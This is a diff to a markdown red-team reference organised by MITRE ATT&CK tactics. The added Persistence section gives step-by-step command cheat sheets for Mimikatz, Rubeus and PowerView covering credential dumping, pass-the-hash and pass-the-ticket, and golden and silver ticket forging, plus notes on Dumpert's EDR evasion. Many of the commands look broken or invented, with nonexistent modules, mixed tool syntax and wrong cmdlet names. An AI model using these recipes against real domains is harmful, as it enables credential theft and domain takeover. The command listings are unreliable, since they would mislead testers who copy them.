@@ -52,7 +52,7 @@ This resource delivers actionable threat intelligence tailored for Red Teams, pe
 * **Dumpert**: Dumpert is an open-source, specialized security tool designed to create a memory dump of the Local Security Authority Subsystem Service (LSASS) process on Windows operating systems. It is primarily used during red team engagements and penetration tests to steal credentials, such as password hashes and Kerberos tickets, while avoiding detection by antivirus (AV) and Endpoint Detection and Response (EDR) solutions. 
 #### Key Functions and Capabilities
 * **LSASS Memory Dumping**: It extracts the memory of lsass.exe, where sensitive user credentials are stored, saving them into a `.dmp` file.
-* **AV/EDR Evasion*: Unlike standard tools (like ProcDump or Mimikatz), Dumpert avoids using common Windows API functions that are heavily monitored by security software.
+* **AV/EDR Evasion**: Unlike standard tools (like `ProcDump` or Mimikatz), Dumpert avoids using common Windows API functions that are heavily monitored by security software.
 * **Direct System Calls (Syscalls)**: It bypasses user-mode hooks by executing system calls directly to the kernel, making it difficult for security products to detect the activity.
 * **API Unhooking**: The tool unhooks API functions to further mask its activities.
 * **Fileless Operation (sRDI)**: It provides an sRDI (shellcode Reflective DLL Injection) version, allowing it to be injected directly into memory via Cobalt Strike, thus avoiding writing files to the disk. 
@@ -81,11 +81,10 @@ An attacker with local administrator privileges on one machine can use secretsdu
 * **Data Collection (SharpHound/AzureHound)**: It uses ingestors (SharpHound for AD, AzureHound for Azure) to collect data on user sessions, group memberships, and ACLs.
 * **Defensive Analysis**: Defenders (blue teams) use it to identify and eliminate dangerous privilege relationships and misconfigurations.
 * **Attack Simulation**: Red teams use it to plan lateral movement and simulate ransomware-style attacks. 
-#### Components
+### Components
 * **Data Ingestors**: SharpHound.exe (C#) or PowerShell scripts gather network data.
 * **Graph Database**: Neo4j stores the relationships.
-* **Visualization GUI**: A web interface (Community Edition) or legacy app displays the graph, revealing attack paths. 
-BloodHound is available as an open-source Community Edition and a managed enterprise version. 
+* **Visualization GUI**: A web interface (Community Edition) or legacy app displays the graph, revealing attack paths. BloodHound is available as an open-source Community Edition and a managed enterprise version. 
 ---
 ## Lateral Movement (TA0008)
 Lateral Movement (TA0008) in the MITRE ATT&CK framework refers to the techniques cyber adversaries use to navigate through a network, moving from an initially compromised system to other hosts, to expand access, steal data, or deploy ransomware. It is a critical post-compromise stage, often involving stolen credentials and legitimate tools to evade detection. 
@@ -122,13 +121,133 @@ This tactic is essential for threat actors to achieve their final objectives, su
 * BloodHound/SharpHound for path analysis
 
 ## Persistence (TA0003)
+Persistence is a core tactic within the MITRE ATT&CK framework, representing techniques that adversaries use to maintain access to a target system, even after disruptions such as consistent reboots, credential changes, or network interruptions. The ultimate goal of this tactic is to ensure long-term, continued presence on a compromised host to facilitate further malicious activity, such as data theft, espionage, or lateral movement. With over 20 distinct techniques categorized under it, persistence is crucial for threat actors because it allows them to retain a foothold even if their initial entry method is discovered and blocked.
 * **Account Manipulation (T1098)**: Modifying privileged groups, adding keys to `authorized_keys`, or manipulating user attributes.
-* **Golden/Silver Ticket Attacks (T1558)**: Forging Kerberos Ticket Granting Tickets (TGT) to maintain domain administrator access.
-### Tools
-* Mimikatz
-* Rubeus
-* PowerView
+* **Tool**: Mimikatz
+* **Use for**: Password Dumping and Credential Manipulation
+```
+# Dump all user passwords from memory (Windows 10/11)
+mimikatz.exe "sekurlsa::logonPasswords"
 
+# Extract NTLM hashes (for pass-the-hash)
+mimikatz.exe "sekurlsa::ntlmv1" "sekurlsa::ntlmv2"
+
+# Steal Kerberos tickets (for pass-the-ticket)
+mimikatz.exe "kerberos::ticket"
+
+# Use a stolen token to log in as another user
+mimikatz.exe "token::elevate" "token::dump /token" "privilege::debug" "token::runas /user:Administrator"
+```
+* **Tool**: Rubeus
+* * **Use for**: Kerberos Ticket Attacks
+```
+# Request a TGT (Ticket Granting Ticket) with a username/password
+Rubeus.exe GetTGT /user:Administrator /password:Secretpass123
+
+# Request a service ticket using a stolen TGT
+Rubeus.exe Requester /tgt:... /s:target.com /dc:domain.com
+
+# Forge a Kerberos ticket (e.g., for pass-the-ticket)
+Rubeus.exe forge /ticket:... /user:Administrator /domain:domain.com
+
+# Use a Kerberos ticket to access a resource
+Rubeus.exe Kerberos::Ticket /ticket:... /s:target.com /dc:domain.com
+```
+* **Tool**: PowerView
+* **Use for**: Active Directory Enumeration
+```
+# Import PowerView module
+Import-Module PowerView
+
+# Enumerate users and their properties
+Get-User -Domain domain.com -UserName *
+
+# Enumerate groups and members
+Get-Group -Domain domain.com -GroupName *
+
+# Find users with specific privileges (e.g., administrators)
+Get-ADObject -Filter {objectClass -eq "user"} -Properties * | Where-Object { $_.userAccountControl -band 16777216 }
+
+# Enumerate processes and their owners (for lateral movement)
+Get-Process -ComputerName target.com | Select-Object ProcessName, Owner
+```
+* **Golden/Silver Ticket Attacks (T1558)**: Forging Kerberos Ticket Granting Tickets (TGT) to maintain domain administrator access.
+* **Tool**: Mimikatz - Golden & Silver Tickets
+* **Use for**: Golden Ticket (Kerberos TGT for Domain-Wide Access)
+```
+# Step 1: Get krbtgt hash (requires SYSTEM privileges)  
+mimikatz.exe "lsa::dump /domain"  
+
+# Step 2: Create a Golden Ticket (using krbtgt hash)  
+mimikatz.exe "kerberos::golden /domain:example.com /user:Administrator /id:500 /password:Secretpass123 /sid:S-1-5-21-... /target:target.com /ticket:golden_ticket.kirbi"  
+
+# Step 3: Load the Golden Ticket into memory  
+mimikatz.exe "kerberos::ptt golden_ticket.kirbi"  
+
+# Step 4: Use the ticket to access resources (e.g., log in as Administrator)  
+mimikatz.exe "ts::login /user:Administrator /domain:example.com"
+```
+* **Tool**: Mimikatz
+* **Use for**: Silver Ticket (Kerberos Service Ticket for Constrained Delegation)
+```
+# Step 1: Get service account hash (e.g., from lsass or Kerberos ticket)  
+mimikatz.exe "sekurlsa::hashes /process"  
+
+# Step 2: Create a Silver Ticket (using service account hash)  
+mimikatz.exe "kerberos::silver /service:HTTP/target.com /user:serviceAccount /password:Secretpass123 /domain:example.com /dc:domain.com"  
+
+# Step 3: Load the Silver Ticket into memory  
+mimikatz.exe "kerberos::ptt silver_ticket.kirbi"  
+
+# Step 4: Use the ticket to access the service (e.g., HTTP)  
+mimikatz.exe "ts::login /user:serviceAccount /domain:example.com"
+```
+* **Tool**: Rubeus - Golden & Silver Tickets
+* **Use for**: Golden Ticket (Kerberos TGT)
+```
+# Step 1: Request a Golden Ticket (using domain credentials)  
+Rubeus.exe golden /user:Administrator /password:Secretpass123 /domain:example.com /sid:S-1-5-21-... /target:target.com  
+
+# Step 2: Use the Golden Ticket to impersonate a user  
+Rubeus.exe ptt /ticket:golden_ticket.kirbi  
+
+# Step 3: Access a resource with the impersonated ticket  
+Rubeus.exe kerberos::ticket /ticket:golden_ticket.kirbi /s:target.com
+```
+* **Tool**: Rubeus
+* **Use for**: Silver Ticket (Kerberos Service Ticket)
+```
+# Step 1: Request a Silver Ticket (using service account credentials)  
+Rubeus.exe silver /service:HTTP/target.com /user:serviceAccount /password:Secretpass123 /domain:example.com /dc:domain.com  
+
+# Step 2: Use the Silver Ticket to access the service  
+Rubeus.exe ptt /ticket:silver_ticket.kirbi  
+
+# Step 3: Access the service (e.g., HTTP) with the ticket  
+Rubeus.exe kerberos::ticket /ticket:silver_ticket.kirbi /s:target.com
+```
+* **Tool**: PowerView - Enumeration for Ticket Attacks
+* **Use for**: Golden Ticket (Identify Target for Impersonation)
+```
+# Step 1: Enumerate domain users (including administrators)  
+Import-Module PowerView  
+Get-User -Domain example.com | Where-Object { $_.UserAccountControl -band 16777216 }  
+
+# Step 2: Find service accounts or SPNs for Silver Ticket targets  
+Get-SPN -Domain example.com | Select-Object -ExpandProperty SPN  
+```
+* **Tool**: PowerView
+* **Use for**: Silver Ticket (Identify Service Targets)
+```
+# Step 1: Enumerate all services (SPNs) in the domain  
+Get-SPN -Domain example.com  
+
+# Step 2: Find users with specific privileges (e.g., for Golden Ticket)  
+Get-ADObject -Filter {objectClass -eq "user"} -Properties * | Where-Object { $_.userAccountControl -band 16777216 }  
+```
+
+
+---
 ## Privilege Escalation (TA0004)
 * **Abuse Elevation Control Mechanism (T1548)**: Leveraging UAC bypass, Token Manipulation, or misconfigured Access Control Lists (ACLs).
 ### Tools
